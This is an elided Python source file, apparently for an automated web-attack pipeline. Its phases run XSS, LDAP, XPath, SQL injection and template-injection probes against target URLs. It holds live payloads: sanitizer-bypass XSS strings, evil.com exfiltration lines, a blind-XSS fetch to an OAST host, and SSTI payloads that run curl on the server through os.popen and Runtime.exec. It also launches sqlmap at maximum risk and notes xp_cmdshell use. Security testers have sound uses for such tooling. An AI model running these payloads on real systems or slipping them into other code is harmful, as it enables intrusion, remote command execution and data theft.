...
async def phase_11_INJECT(
    ...
    if xss_urls and t.has("dalfox"):
            ...
            prefilter_jobs.append(
                (
                    ...
                    [
                        "bash",
                        "-c",
                        f"Gxss -o {shlex.quote(str(gxss_out))} < {shlex.quote(str(xss_in))}",
                    ],
                    900,
                )
            )
        ...
        dalfox_in = (
            gxss_out
            if t.has("Gxss") and not t.has("kxss")
            else kxss_out
            if t.has("kxss")
            else xss_in
        )
        ...
        with _CREDENTIAL_LOCK:
            _dlf_cookie = _CREDENTIAL_STORE.get("COOKIE", "")
        if _dlf_cookie:
            dalfox_cmd.extend(["--cookie", _dlf_cookie])
        with _CREDENTIAL_LOCK:
            _dlf_headers = _CREDENTIAL_STORE.get("EXTRA_HEADERS", "")
        if _dlf_headers:
    ...
    if oast_domain and ssrf_urls and _SAFE_HOST.match(oast_domain):
        ...
        if blind_xss_urls and oast_domain and _SAFE_HOST.match(oast_domain):
            ...
            if blind_script.is_symlink():
                blind_script.unlink()
            _xss_b64 = base64.b64encode(
                f"fetch('http://{oast_domain}/blind=xss')".encode()
            ).decode()
    ...
    ldap_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][
    ...
    async def _probe_ldap(url: str) -> List[str]:
        ...
        try:
            base_req = urllib.request.Request(
                url, headers={"User-Agent": "Mozilla/5.0", **_ld_extra_headers}
            )
            ...
            for payload in _LDAP_PAYLOADS:
                ...
                try:
                    req = urllib.request.Request(
                        test_url, headers={"User-Agent": "Mozilla/5.0", **_ld_extra_headers}
                    )
                    ...
                    if any(ind in body for ind in _LDAP_SPECIFIC_INDICATORS):
                        ...
                        break
                    generic_new = {
                        w for w in _LDAP_GENERIC_BASELINE if w in body and w not in baseline_lower
                    }
                    if generic_new:
                        results.append(
    ...
    async def _probe_xpath(url: str) -> List[str]:
        ...
        try:
            ...
            _, _, base_bytes = await _async_urlopen(_ld_urlopen, base_req, timeout=8)
            base_bytes.decode("utf-8", errors="ignore").lower()
        except asyncio.CancelledError:
            raise
        except Exception:
            return results
            ...
            for payload in _XPATH_PAYLOADS:
                ...
                try:
                    ...
                    if any(ind in xp_body for ind in _XPATH_INDICATORS):
                        results.append(
                            f"[xpath-candidate] {test_url} param={pname} payload={payload}"
                        )
                        break
                except asyncio.CancelledError:
                    raise
    ...
    # XSS methodology notes written to xss_methodology.txt
    xss_notes = [
        "--- DOM Clobbering ---",
        "[xss-dom-clobber] Test via anchor/<a id=...> elements clobbering global JS variables",
        '[xss-dom-clobber] Payload: <a id=config><a id=config name=apiUrl href="https://evil.com">',
        "[xss-dom-clobber] Check for window.X or document.X patterns that can be clobbered",
        "",
        "--- Mutation XSS (mXSS) ---",
        "[xss-mutation] Sanitizer API bypass: <math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
        "[xss-mutation] DOMPurify bypass: <svg><p><style><img src=x onerror=alert(1)>",
        "[xss-mutation] Mutation Observable: innerHTML mutation after sanitizer processing",
        "",
        "--- Scriptless XSS ---",
        '[xss-scriptless] CSS injection: <link rel="stylesheet" href="https://evil.com/css-exfil">',
        '[xss-scriptless] Style tag exfiltration: input[value^="a"]{background:url(https://evil.com/char=a)}',
        '[xss-scriptless] <meta> refresh: <meta http-equiv="refresh" content="0;url=https://evil.com">',
        '[xss-scriptless] <base> tag hijacking: <base href="https://evil.com/">',
        "",
        "--- Manual Review Notes ---",
        "[xss-review] Check for innerHTML, outerHTML, document.write sinks",
        "[xss-review] Check for eval, setTimeout(string), Function(string) sinks",
        "[xss-review] Check for postMessage listeners without origin validation",
    ]
    ...
    parts = [
        ...
        outdir / "ldap_injection.txt",
        outdir / "xpath_injection.txt",
    ]
                ...
                for url in param_urls:
                    ...
                    try:
                        ...
                        sink_report = await page.evaluate("""() => {
                            ...
                            if (document.head && document.head.innerHTML.includes(c)) r.push('head.innerHTML');
                            const iframes = document.querySelectorAll('iframe');
                            for (let i = 0; i < iframes.length; i++) {
                                try { if (iframes[i].src && iframes[i].src.includes(c)) r.push('iframe.src'); } catch(e) {}
                                try { if (iframes[i].contentDocument && iframes[i].contentDocument.body && iframes[i].contentDocument.body.innerHTML.includes(c)) r.push('iframe.contentDocument'); } catch(e) {}
                            }
                            const links = document.querySelectorAll('a[href]');
                            for (let i = 0; i < links.length; i++) {
                                try { if (links[i].href.includes(c)) r.push('a.href'); } catch(e) {}
                            }
                            const imgs = document.querySelectorAll('img[src]');
                            for (let i = 0; i < imgs.length; i++) {
                                try { if (imgs[i].src.includes(c)) r.push('img.src'); } catch(e) {}
                            }
                            const scripts = document.querySelectorAll('script[src]');
                            for (let i = 0; i < scripts.length; i++) {
                                try { if (scripts[i].src.includes(c)) r.push('script.src'); } catch(e) {}
                            }
...
async def phase_11b_SQLMAP(
    ...
    param_urls = [u for u in deduped if "=" in u and not _is_static_url(u)][
    ...
    if t.has("sqlmap"):
        ...
        # Second pass with --level=5 --risk=3 for deeper coverage
        runner_deep = outdir / "logs" / "sqlmap_11b_deep_runner.sh"
        ensure(runner_deep)
        runner_deep.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"IN={shlex.quote(str(sqlmap_in))}\n"
            f"DIR={shlex.quote(str(sqlmap_dir / 'deep'))}\n"
            'mkdir -p "$DIR"\n'
            f'sqlmap -m "$IN" --batch --level=5 --risk=3 --random-agent '
            f"--delay={max(_PIPELINE_CFG.delay, 0)} --time-sec=10 "
            f"{_sql_extra}"
            f' --output-dir="$DIR" > "{shlex.quote(str(outdir / "sqlmap_11b_deep.log"))}" 2>&1\n'
        )
        runner_deep.chmod(0o700)
        await _run("sqlmap-11b-deep", ["bash", str(runner_deep)], 18000, outdir)
        # Parse first pass log
        ...
        if sqlmap_log.exists():
            for ln in read_lines(sqlmap_log):
                ...
                if any(
                    ...
                    if not any(
                        neg in lower for neg in ("not injectable", "not tested", "no parameter")
                    ):
                        findings.append(ln)
        # Parse deep scan log
        sqlmap_deep_log = outdir / "sqlmap_11b_deep.log"
        if sqlmap_deep_log.exists():
            for ln in read_lines(sqlmap_deep_log):
                lower = ln.lower()
                if any(
                    kw in lower
                    for kw in (
                    ...
                    if not any(
                        ...
                        findings.append("[deep] " + ln)
        findings.append(
            "[db-payloads] MSSQL: test xp_cmdshell via EXEC xp_cmdshell or EXEC master..xp_cmdshell"
        )
        findings.append(
            "[db-payloads] PostgreSQL: test COPY FROM PROGRAM via COPY (SELECT '') TO PROGRAM"
        )
        findings.append(
            "[db-payloads] Time-based: --time-sec=10 used in deep scan for blind detection"
        )
    else:
...
async def phase_12_SSTI(
    ...
    eval_map = {
        # Jinja2 / Twig / Nunjucks / Freemarker
        "{{7*7}}": "49",  # Jinja2/Nunjucks/Twig
        "${7*7}": "49",  # Freemarker/Velocity
        "#{7*7}": "49",  # Ruby ERB / Slim
        "*{7*7}": "49",  # Generic
        "{{7*'7'}}": "49",  # Jinja2/Nunjucks string multiplication (7->int coercion)
        "${7*'7'}": "77",  # Freemarker string concatenation
        "<%= 7*7 %>": "49",  # ERB / ASP
        "${{7*7}}": "49",  # Thymeleaf
        # Twig / Jinja2
        "{%25=7*7%25}": "49",  # URL-encoded
        # Smarty / Blade
        "{7*7}": "49",  # Smarty / Blade
        "@(7*7)": "49",  # Expression Language
        # Velocity / Mako / Nunjucks
        "#set($x=7*7)$x": "49",  # Velocity
        "${ 7*7 }": "49",  # Velocity / Mako
        # Slim / Razor / Jade
        "<% 7*7 %>": "49",  # ASP / Slim
        "- 7 * 7": "49",  # Slim text
        # Pebble / Thymeleaf
        "<#if 7*7==49>yes</#if>": "yes",  # Pebble
        "[(${7*7})]": "49",  # Thymeleaf
        # Generic math-based detection
        "{{7+'7'}}": "77",  # Jinja2 string concat
        "${7+'7'}": "77",  # Freemarker string concat
        # Information disclosure payloads
        "{{config}}": "Config",  # Jinja2 config leak
        "{% debug %}": "debug",  # Django/Twig debug output
        "{{ ''.__class__.__mro__[2].__subclasses__() }}": "subclasses",  # Python class hierarchy
    }
        ...
        if base_url not in baseline_counts:
            try:
                ...
                baseline_counts[base_url] = {
                    exp: base_body.count(exp) for exp in set(eval_map.values())
                }
    ...
    # Blind SSTI OOB check — fire payloads that trigger callbacks to OAST
    if oast_domain and _SAFE_HOST.match(oast_domain):
        oob_payloads = [
            "{{lipsum.__globals__.os.popen('curl http://"
            + oast_domain
            + "/ssti-oob-jinja').read()}}",
            "${''.class.forName('java.lang.Runtime').getRuntime().exec('curl http://"
            + oast_domain
            + "/ssti-oob-fm')}",
        ]
        for u in param_urls[: _PIPELINE_CFG.sample_urls_fuzz]:
            ...
            for param_name in qs:
                ...
                for p in oob_payloads:
                    test_qs = qs.copy()
                    test_qs[param_name] = [p]
                    new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                    test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                    try:
                        req = urllib.request.Request(
                            test_url,
                            headers={"User-Agent": "Mozilla/5.0", **_ssti_extra_headers},
                        )
                        await _async_urlopen(_ssti_urlopen, req, timeout=10)
                        ssti_findings.append(
                            f"[SSTI-blind-oob] {test_url} param={param_name} (check {oast_domain} for callback)"
                        )
                    except Exception:
                        continue
